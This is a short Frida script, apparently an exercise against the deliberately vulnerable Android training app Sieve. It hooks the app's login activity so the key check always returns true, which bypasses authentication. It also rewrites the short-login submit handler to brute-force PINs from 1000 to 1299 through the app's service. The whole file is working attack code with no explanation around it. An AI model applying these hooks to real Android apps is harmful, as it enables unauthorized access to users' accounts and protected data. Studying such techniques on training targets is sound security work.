
Java.perform(function () {
	var Log = Java.use("android.util.Log");
	Log.v("frida-sieve", "JS activo");

    //Obtain referrence of the Activity currently running
    var MainActivity = Java.use('com.mwr.example.sieve.MainLoginActivity');
	//Obtain reference of the function whcih needs to be called
    MainActivity.checkKeyResult.implementation = function (b) {
        send('checkKeyResult');
	//Calling the function and passing the boolean parameter as true
        this.checkKeyResult(true);
		Log.v("frida-sieve", "checkKeyResult");
		
        console.log('Done:');
    };
	
	var ShortLoginActivity = Java.use('com.mwr.example.sieve.ShortLoginActivity');
    ShortLoginActivity.submit.implementation = function(v){
		var service=this.serviceConnection.value
        for(var i=1000; i<1300; i++)
			{
				service.checkPin(i+"");
				send(i + ": ");
				Log.v("frida-sieve", "Probando con: "+i);
			}
		Log.v("frida-sieve", "submit");

    };
});